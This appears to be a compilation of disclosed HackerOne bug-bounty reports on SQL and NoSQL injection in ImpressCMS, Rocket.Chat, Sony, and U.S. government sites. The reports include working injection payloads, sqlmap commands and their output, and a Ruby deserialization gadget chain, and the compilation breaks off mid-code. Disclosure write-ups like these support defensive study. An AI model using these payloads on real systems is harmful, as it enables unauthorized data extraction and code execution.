Referer: https://██████/DSF/SmartStore.aspx?6xni2of2cF01Wh1WA1f8KvqWdFIzCmht0 f1rjakhLYZYEorRbI5CMSxx2CBgN1b
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8
Connection: close

      <soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' >      <soapenv:Header>     <AuthenticationHeader xmlns='http://www.efi.com/dsf/BuyerTicketClientServices'>      <SiteGUID>17b9c74a-f80b-4e48-b274-729acb2e14ad</SiteGUID>
<SessionTokenID>49f22361-1243-4cde-9788-7bad2eb575ed</SessionTokenID>
<TimeOut>20</TimeOut>
<CultureName>zh-CN</CultureName>

      </AuthenticationHeader>      </soapenv:Header>     <soapenv:Body>      <GetAllFacilitiesForNewUserRegistration xmlns='http://www.efi.com/dsf/StorefrontService'>      <companyId>-1</companyId>
<cultureName>zh-CN</cultureName>
<sortColumn>description</sortColumn>
<sortOrder>asc</sortOrder>
<searchValue>1'  and substring(system_user,1,16)='public\dsfwsuser' and '%'='</searchValue>
<currentPageIndex>1</currentPageIndex>
<recordsToFetch>10</recordsToFetch>

      </GetAllFacilitiesForNewUserRegistration>      </soapenv:Body>      </soapenv:Envelope>
```

## Suggested Mitigation/Remediation Actions

---

### [SQL Injection in version 1.4.3 and below](https://hackerone.com/reports/1506129)

- **Report ID:** `1506129`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** ImpressCMS
- **Reporter:** @cyberinsane
- **Bounty:** - usd
- **Disclosed:** 2023-08-12T16:44:07.273Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
SQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application. If misconfigured, an attacker can even upload a malicious web shell to compromise the entire system.

## ImpressCMS branch :
[1.4]
## Browsers Verified In:

  Google Chrome, Firefox]

## Steps To Reproduce:
Step1- Login with Admin Credentials
Step2- Vulnerable Parameter to SQLi: mimetypeid (POST request):

POST /ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1 HTTP/1.1
Host: 192.168.56.117
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------40629177308912268471540748701
Content-Length: 1011
Origin: http://192.168.56.117
Connection: close
Referer: http://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1
Cookie: tbl_SystemMimetype_sortsel=mimetypeid; tbl_limitsel=15; tbl_SystemMimetype_filtersel=default; ICMSSESSION=7c9f7a65572d2aa40f66a0d468bb20e3
Upgrade-Insecure-Requests: 1

-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="mimetypeid"

1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="extension"

bin
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="types"

application/octet-stream
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="name"

Binary File/Linux Executable
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="icms_page_before_form"

http://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="op"

addmimetype
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="modify_button"

Submit
-----------------------------40629177308912268471540748701--

Vulnerable Payload:
1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)   //time-based blind (query SLEEP)

Output:
web application technology: Apache 2.4.52, PHP 7.4.27
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
available databases [6]:
[*] impresscms
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

## Suggestions to mitigate or resolve the issue:
Use Parameterized Queries

## Supporting Material/References:
https://github.com/sartlabs/0days/blob/main/ImpressCMS1.4.3/Exploit.txt

  * [attachment / reference]

## Impact

SQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application. If misconfigured, an attacker can even upload a malicious web shell to compromise the entire system.

---

### [NoSQL injection in listEmojiCustom method call](https://hackerone.com/reports/1757676)

- **Report ID:** `1757676`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Rocket.Chat
- **Reporter:** @rijalrojan
- **Bounty:** - usd
- **Disclosed:** 2023-05-09T20:01:18.967Z
- **CVE(s):** CVE-2023-28359

**Summary (team):**

A NoSQL injection vulnerability has been identified in the listEmojiCustom method call within Rocket.Chat. This can be exploited by unauthenticated users when there is at least one custom emoji uploaded to the Rocket.Chat instance. The vulnerability causes a delay in the server response, with the potential for limited impact.

---

### [SQL Injection at https://████ via ███ parameter](https://hackerone.com/reports/1935151)

- **Report ID:** `1935151`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Sony
- **Reporter:** @kauenavarro
- **Bounty:** - usd
- **Disclosed:** 2023-04-24T17:49:10.443Z
- **CVE(s):** -

**Summary (team):**

The researcher reported that a Sony website was vulnerable to a time-based SQL injection. The researcher was able to demonstrate the vulnerability by running a sleep() command on the underlying database. The researcher then used SQLMap to extract data from the database such as table names, the database user name, and the database hostname.

---

### [Time Based SQL Injection](https://hackerone.com/reports/1878584)

- **Report ID:** `1878584`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** U.S. Department of State
- **Reporter:** @shadow-krd
- **Bounty:** - usd
- **Disclosed:** 2023-04-20T17:56:14.942Z
- **CVE(s):** -

**Vulnerability Information:**

Hello and greetings and respect to you, dear friends
We all know that the sql injection bug is very dangerous, so this bug should be eliminated as soon as possible.
I've identified an SQL injection vulnerability of  type  Time Based on█████████ ██████ 
Below, we see how we found this vulnerability 
If you look carefully, we see that search in the website name Search results The gap has occurred there
as you can see ████████ Method  [██████████████/?███████ ]
now it's time to inject or generate POC with lovely tool sqlmap 
We used a text file here by Name request.txt
and this is our command in sqlmap you can use this command for your own confidence

███ █████████
===========================================================================================
███████████/?██████ HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Referer:█████████/?███
Content-Length: 133
Cookie: ███████
Connection: Close
██████
======================================================================================
 ████ █████
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.1.5#dev}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   ██████████

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ ██████████ █████

[████] [INFO] parsing HTTP request from 'request'
[███████] ███
[███████] █████████████ Firefox/3.0b5' from file '/home/ubuntu/sqlmap/data/txt/user-agents.txt'
█████ ████████ body. Do you want to process it? [Y/n/q] Y
[█████] [INFO] resuming back-end █████████S 'mysql'
[███] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) ██████)
   ██████████
    ██████████
   █████████
---
[████] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[████████] [INFO] the back-end ██████████████
████
back-end ████S: ███████
[████████] [INFO] fetching database names
[███████] [INFO] fetching number of databases
[█████████] [WARNING] reflective value(s) found and filtering out
[████████] ███
[██████████]████████
[██████████]███████
[████] ██████
[██████]█████████
[█████]████
[█████]█████████
[██████]████████
[██████]██████
[███] █████████
[██████████]██████████
[███████] ██████
[██████████]████████
[█████████]█████████
[█████████]███
[██████]██████
[██████]█████
[████████]██████████
[███████]████████
available databases [6]:
███
████
██████████
█████████
███████
███

Notice:
I didn't extracted any data from the database, but just for generate POC

## Impact

the hackers can be dump all information like all database tables then after that login to the website

available databases [6]:
█████████
██████████
██████
█████
█████████
███

---

### [SQL Injection in CVE Discovery Search ](https://hackerone.com/reports/1893800)

- **Report ID:** `1893800`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** HackerOne
- **Reporter:** @rcoleman
- **Bounty:** - usd
- **Disclosed:** 2023-03-06T19:52:20.028Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Unsanitized user-controlled inputs in the CVE Discovery Search allow for SQL injection.

**Description:**
Search terms are split on whitespace but no additional sanitization is applied, allowing arbitrary SQL statements, such as a blind or timing-based attack. 

### Steps To Reproduce

1. Visit https://hackerone.com/intelligence/cve_discovery
2.  Enter a search term that normally returns results, plus an injection payload such as /**/AND/**/'1%'='1 and confirm that the results are still returned
3. Change the payload to /**/AND/**/'1%'='0 and confirm that no results are returned

### Optional: Your Environment (Browser version, Device, etc)

 * Chrome

### Optional: Supporting Material/References (Screenshots)
{F2211684}
{F2211685}

## Impact

Disclosure of  data in Analytics Database, including report, team, and asset data

---

### [SQL Injection at https://████████.asp (█████████) [selMajcom] [HtUS]](https://hackerone.com/reports/1628408)

- **Report ID:** `1628408`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @haxor31337
- **Bounty:** - usd
- **Disclosed:** 2023-01-06T18:56:03.398Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
SQL injection (SQLi) is a vulnerability in which an application accepts input into an SQL statement and treats this input as part of the statement. Typically, SQLi allows a malicious attacker to view, modify or delete data that should not be able to be retrieved. An SQLi vulnerability was found for this host which allows an attacker to execute code and view data from the SQL service by submitting SQL queries.

An attacker could exploit this lack of input sanitization to exfiltrate database data and files, tamper with the data, or perform resource exhaustion. Depending on the database and how it is configured, an attacker could potentially remotely execute code on the server running the database.

I found SQL Injection at https://█████████.asp allowing attacker can exfiltrate database and leak sensitive data of ███████ without authentication.

## Steps To Reproduce:
1. Access to https://████.asp 
Create an user, after create go to https://████.asp
2. Capture request on burpsuite with the following request

```
GET /█████mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1
Host: ██████████.████.net:443
Cookie: ebsprod=7nchaAqvaxeCArcwSjtyE0HiG4; ASPSESSIONIDQQBSACRQ=MPHFFIECABOOKHDLEIEEOAHA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```
Inject SQL query to vulnerable parameter **selMajcom**

Save request to file dod.txt

```
GET /██████mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1
Host: ███.██████████.net:443
Cookie: ebsprod=7nchaAqvaxeCArcwSjtyE0HiG4; ASPSESSIONIDQQBSACRQ=MPHFFIECABOOKHDLEIEEOAHA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close

```
Attack automation with sqlmap command

```
python sqlmap.py -r dod.txt --dbs --level 3 risk 3 -v3
```

## Supporting Material/References:
█████

```
available databases [24]:
[*] ActivityManager
[*] AFMajcomBases
[*] AFNAF
[*] AFServicesUsers
[*] AFSponsorship
[*] AssetsAndLiabilities
[*] BaseProjects
[*] BEFT
[*] CGO
[*] EICSQL
[*] master
[*] model
[*] msdb
[*] NAFDIS
[*] NAFRIS_restore
[*] ORCA
[*] Property
[*] RMD
[*] ██████████
[*] tempdb
[*] TSD
[*] Unemployment
[*] VMS_Test
[*] W2DATA
```

## Impact

Data exfiltration through a SQLi attack could lead to reputational damage or regulatory fines for the business due to an attacker’s unauthorized access to data. This could also result in reputational damage for the business through the impact to customers’ trust. The severity of the impact to the business is dependent on the sensitivity of the data being stored in, and transmitted by the application.
Leak sensitive data on █████████ service.

---

### [SQL Injection on [█████████]](https://hackerone.com/reports/1213207)

- **Report ID:** `1213207`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Sony
- **Reporter:** @splint3rsec
- **Bounty:** - usd
- **Disclosed:** 2022-12-07T20:04:13.070Z
- **CVE(s):** -

**Summary (team):**

The researcher reported that the login form of a Sony endpoint was susceptible to an error-based SQL injection vulnerability. The researcher intercepted a login request using BurpSuite and then used SQLMap to discover the SQL injection. Once the SQL injection vulnerability was discovered, SQLMap was used to enumerate database names.

---

### [Unauthenticated SQL Injection at █████████  [HtUS]](https://hackerone.com/reports/1626226)

- **Report ID:** `1626226`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0xd0ff9
- **Bounty:** - usd
- **Disclosed:** 2022-10-14T17:54:41.604Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
Hi team, I found Unauthenticated SQL Injection at ██████. Because of non-filter and non-escape input at API /api/organizations/*, attacker can inject malicious payload after single quote (') to exploit and extract database.

## Step to Reproduce:

Execute Request
```
GET /api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers



```


Then the response is 

```
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 209
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
X-DNS-Prefetch-Control: off
Expect-CT: max-age=0
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Content-Type-Options: nosniff
Origin-Agent-Cluster: ?1
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
X-XSS-Protection: 0
Strict-Transport-Security: max-age=31536000
Expires: Tue, 05 Jul 2022 04:12:11 GMT
Cache-Control: max-age=0, no-cache, no-store
Pragma: no-cache
Date: Tue, 05 Jul 2022 04:12:11 GMT
Connection: keep-alive

{"statusCode":500,"code":"P2010","error":"Internal Server Error","message":"\nInvalid `prisma.queryRaw()` invocation:\n\n\n  Raw query failed. Code: `1105`. Message: `XPATH syntax error: ':█████████'`"}
```


The result was leaked by SQL XPATH Error, so we get user() = ████████

Change query to version() we get version = 8.0.23
https://██████/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa

Change query to version() we get database = ███
https://███/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa

█████████
██████████
███
To extract data, we use this requests
```
GET /api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from%20information_schema.tables%20limit%2054,1))))=' HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers


```

█████

## Impact

Attacker can extract database from server █████

---

### [SQL Injection through /include/findusers.php](https://hackerone.com/reports/1081145)

- **Report ID:** `1081145`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** ImpressCMS
- **Reporter:** @egix
- **Bounty:** - usd
- **Disclosed:** 2022-10-06T18:51:25.975Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The vulnerability is located in the `/include/findusers.php` script:

```
281.			$total = $user_handler->getUserCountByGroupLink(@$_POST["groups"], $criteria);
282.	
283.			$validsort = array("uname", "email", "last_login", "user_regdate", "posts");
284.			$sort = (!in_array($_POST['user_sort'], $validsort)) ? "uname" : $_POST['user_sort'];
285.			$order = "ASC";
286.			if (isset($_POST['user_order']) && $_POST['user_order'] == "DESC") {
287.				$order = "DESC";
288.			}
289.	
290.			$criteria->setSort($sort);
291.			$criteria->setOrder($order);
292.			$criteria->setLimit($limit);
293.			$criteria->setStart($start);
294.			$foundusers = $user_handler->getUsersByGroupLink(@$_POST["groups"], $criteria, TRUE);
```

User input passed through the "groups" POST parameter is not properly sanitized before being passed to the `icms_member_Handler::getUserCountByGroupLink()` and `icms_member_Handler::getUsersByGroupLink()` methods at lines 281 and 294. These methods use the first argument to construct a SQL query without proper validation:

```
461.		public function getUsersByGroupLink($groups, $criteria = null, $asobject = false, $id_as_key = false) {
462.			$ret = array();
463.	
464.			$select = $asobject ? "u.*" : "u.uid";
465.			$sql[] = "	SELECT DISTINCT {$select} "
466.					. "	FROM " . icms::$xoopsDB->prefix("users") . " AS u"
467.					. " LEFT JOIN " . icms::$xoopsDB->prefix("groups_users_link") . " AS m ON m.uid = u.uid"
468.					. "	WHERE 1 = '1'";
469.			if (! empty($groups)) {
470.				$sql[] = "m.groupid IN (" . implode(", ", $groups) . ")";
471.			}
```

This can be exploited by remote attackers to e.g. read sensitive data from the "users" database table through boolean-based SQL Injection attacks.

## ImpressCMS branch :
The vulnerability has been tested and confirmed on ImpressCMS version 1.4.2 (the latest at the time of writing).

## Steps To Reproduce:
Use the attached Proof of Concept (PoC) script to reproduce this vulnerability. It's a PHP script supposed to be used from the command-line (CLI). You should see an output like the following:

```
$ php sqli.php http://localhost/impresscms/
[-] Retrieving security token...
[-] Starting SQL Injection attack...
[-] Admin's email: admin@test.com
```

The PoC leverages both this vulnerability and the one reported at #1081137 to achieve unauthenticated exploitation.

## Impact

This vulnerability might allow **unauthenticated attackers** to disclose any field of the "users" database table, including the users' email addresses and password hashes, potentially leading to full account takeovers.

**NOTE**: normally, successful exploitation of this vulnerability should require an admin user session. However, due to the vulnerability described in report #1081137, this could be exploited by unauthenticated attackers as well.

**Summary (researcher):**

Here you can find a full technical write-up for this vulnerability and its exploitation:
https://karmainsecurity.com/impresscms-from-unauthenticated-sqli-to-rce

---

### [Regex account takeover](https://hackerone.com/reports/1581059)

- **Report ID:** `1581059`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Rocket.Chat
- **Reporter:** @ghaem51
- **Bounty:** - usd
- **Disclosed:** 2022-09-22T16:00:23.487Z
- **CVE(s):** CVE-2022-32211

**Summary (team):**

**Summary:**
 get admin  reset token with authenticated user

**Description:** 
normal user login can access to  admin reset token and set a new password for admin user

## Releases Affected:

  * 3.18.5
* 3.0.5

## Steps To Reproduce (from initial installation to vulnerability):

(Add details for how we can reproduce the issue)

  1. login with low privilege user 
  2. copy rc_uid and rc_token for script
  3. request for admin email password you can find admin mail with the script 
  4. run python script to get reset token with "blind no SQL injection" ( regex search )

## Supporting Material/References:

  * 

## Suggested mitigation

  * [list any suggested patches or steps to mitigate the problem]

## Impact

the attacker could gain admin access and escalate their own user

## Fix

3.18.6, 4.4.4 and 4.7.3>

---

### [time based SQL injection at [https://███] [HtUS]](https://hackerone.com/reports/1627970)

- **Report ID:** `1627970`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @malcolmx
- **Bounty:** - usd
- **Disclosed:** 2022-09-14T21:10:48.278Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

##Summary

while doing test on [`www.█████`](http://www.████████/) I’ve found that the endpoint at `/olc/setlogin.php` is vulnerable with SQL injection vulnerability

##Vulnerable parameters 

- username
- password

##POC

- using time based to verify , submit the below request

```jsx
POST /olc/setlogin.php HTTP/1.1
Host: www.██████
Cookie: UsafNoticeConsent=1; PHPSESSID=5r61rj890ogju3dvb5ptup2mn1; session=expiry=1657062712923491
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: https://www.██████████
Referer: https://www.████/olc/sethomepage.html
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

██████████'%2b(select*from(select(sleep(5)))a)%2b'&█████████
```

- we can see that the response time will be `5`

{██████████]



- sqlmap run command

```jsx
python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent  -u https://█████████ --data="████████&██████" -p username --dbms=mysql 
```

- if you got message `got a 302 redirect to '[https://www.█████:443/olc/sethomepage.html](https://www.████████/olc/sethomepage.html)'. Do you want to follow? [Y/n] n`

press `n` to not follow the redirection 

- we can se that our target parameter is vulnerable

```jsx
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 586 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-1559' OR 4924=4924 OR 'XiUq'='JgnT&██████████

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: █████' AND (SELECT 9612 FROM (SELECT(SLEEP(5)))xSGk) OR 'CPXv'='aouS&██████
---
[23:27:33] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[23:27:33] [INFO] the back-end DBMS is MySQL
web application technology: Apache
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[23:27:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/www.█████████'

[*] ending @ 23:27:34 /2022-07-05/
```

███

- add `--dbs` will back to us with the databases

```jsx
available databases [13]:
[] ███
[] ██████mobile
[] GET
[] information_schema
[] LEAM
[] leat
[] LEV
[] mysql
[] performance_schema
[] SET
[] test
[] testadmin
[*] testusers
```

## Impact

attacker is able to get the database

---

### [SQL injection at [█████████] [HtUS]](https://hackerone.com/reports/1626198)

- **Report ID:** `1626198`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @malcolmx
- **Bounty:** - usd
- **Disclosed:** 2022-09-14T21:06:26.137Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

##Summary

while doing test on [`█████`](http://███████/) I’ve found that the endpoint at `/olc/set/m101/leasib.php` is vulnerable with SQL injection vulnerability

##Vulnerable parameters 

- scn
- SUBJECT
- COURSEID

##POC

1. using sqlmap run command `python3 [sqlmap.py](http://sqlmap.py/) --level=5 --risk=3 --tamper=space2comment --random-agent -u [https://████/olc/set/m101/leasib.php](https://█████/olc/set/m101/leasib.php) --data="COURSEID=M101&SUBJECT=Entry%20Briefing&StudentName=dPbRKJwr&Submit=Submit%20Confirmation&scn=0" -p scn`
2. we can se that the target is vulnerable 

```jsx
Parameter: scn (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x5648745a FROM DUAL WHERE 7300=7300 AND 1308=1308)||'

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x47636148 FROM DUAL WHERE 1321=1321 AND (SELECT 7303 FROM(SELECT COUNT(*),CONCAT(0x7171706271,(SELECT (ELT(7303=7303,1))),0x71716b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x47774954 FROM DUAL WHERE 5475=5475 AND (SELECT 6347 FROM (SELECT(SLEEP(5)))eoxH))||'
---
```

1. add - -dbs we can see the databases   

```jsx
available databases [13]:
[*] ███
[*] ███mobile
[*] GET
[*] information_schema
[*] LEAM
[*] leat
[*] LEV
[*] mysql
[*] performance_schema
[*] SET
[*] test
[*] testadmin
[*] testusers
```

## Impact

allows remote attacker to gain access to the database

---

### [SQL injection at [https://█████████] [HtUS]](https://hackerone.com/reports/1627995)

- **Report ID:** `1627995`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @malcolmx
- **Bounty:** - usd
- **Disclosed:** 2022-09-14T21:04:28.150Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

##Summary

while doing test on [`www.███`](http://www.██████/) I’ve found that the endpoint at [`/olc/███comments/comment_post.php`](https://████████) is vulnerable with SQL injection vulnerability

##Vulnerable parameters 

- staff_student

##POC

- using sqlmap run command

```jsx
python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent  -u "https://███████" --data="staff_student=STUDENT&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit+Comments" -p staff_student --dbms=mysql 
```

- we can see that the target parameter is vulnerable

```jsx
POST parameter 'staff_student' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 103 HTTP(s) requests:
---
Parameter: staff_student (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: staff_student=STUDENT'||(SELECT 0x6545736f FROM DUAL WHERE 6919=6919 AND 4128=4128)||'&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit Comments

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: staff_student=STUDENT'||(SELECT 0x615a636e FROM DUAL WHERE 7192=7192 AND (SELECT 4865 FROM (SELECT(SLEEP(5)))VDbe))||'&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit Comments
```

{F1810520}
- add `--dbs` we can see the sqlmap will start get the DBS

```jsx
available databases [13]:
[] █████████
[] ██████mobile
[] GET
[] information_schema
[] LEAM
[] leat
[] LEV
[] mysql
[] performance_schema
[] SET
[] test
[] testadmin
[*] testusers
```


{F1810521}

## Impact

attacker is able to get the database

---

### [Ability to escape database transaction through SQL injection, leading to arbitrary code execution](https://hackerone.com/reports/1663299)

- **Report ID:** `1663299`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** HackerOne
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2022-08-09T18:58:36.634Z
- **CVE(s):** -

**Vulnerability Information:**

HackerOne has an internal backend interface that gives debugging capabilities to its engineers. One of the features is the ability to run `EXPLAIN ANALYZE` queries against a connected database. This feature is accessible by a handful of engineers. The feature is vulnerable to a SQL injection that allows an attacker to escape the transaction that is wrapped around the `EXPLAIN ANALYZE` query. This SQL injection can be leveraged to execute arbitrary ruby on an application server.

This vulnerability will be demonstrated against a local development environment.

# Proof of concept
- go to http://localhost:8080/support/sql_query_analyzer
- analyze the following query using the `public` database connection:

```sql
SELECT
        1
;

ROLLBACK
;

INSERT
    INTO
        user_versions (
            item_type
            ,item_id
            ,event
            ,email
            ,object
        )
    VALUES (
        'User'
        ,2
        ,'update'
        , 'uniquekeywordtotriggercode@hackerone.com'
        ,'---
username:
  - !ruby/object:Gem::Installer
      i: x
  - !ruby/object:Gem::SpecFetcher
      i: y
  - !ruby/object:Gem::Requirement
    requirements:
      !ruby/object:Gem::Package::TarReader
      io: &1 !ruby/object:Net::BufferedIO
        io: &1 !ruby/object:Gem::Package::TarReader::Entry
            read: 0
            header: "abc"
        debug_output: &1 !ruby/object:Net::WriteAdapter
            socket: &1 !ruby/object:Gem::RequestSet
                sets: !ruby/object:Net::WriteAdapter
                    socket: !ruby/module ''Kernel''
                    method_id: :system
                git_set: sleep 600
            method_id: :resolve '
    )
;

-- 
```
- visit http://localhost:8080/support/historic_users?historic_user_input=uniquekeywordtotriggercode@hackerone.com and observe that the page will hang for 600 seconds and then result in a 500 internal server error, proving that it executes the `sleep 600` command in the injected object.

# Root cause
The following Ruby code is used to execute the `EXPLAIN ANALYZE` query:

```ruby
# ...
explain_analyze = "EXPLAIN (ANALYZE, COSTS, VERBOSE, BUFFERS, FORMAT JSON) #{raw_sql}"

begin
  conn.transaction(requires_new: true) do
    block = proc do
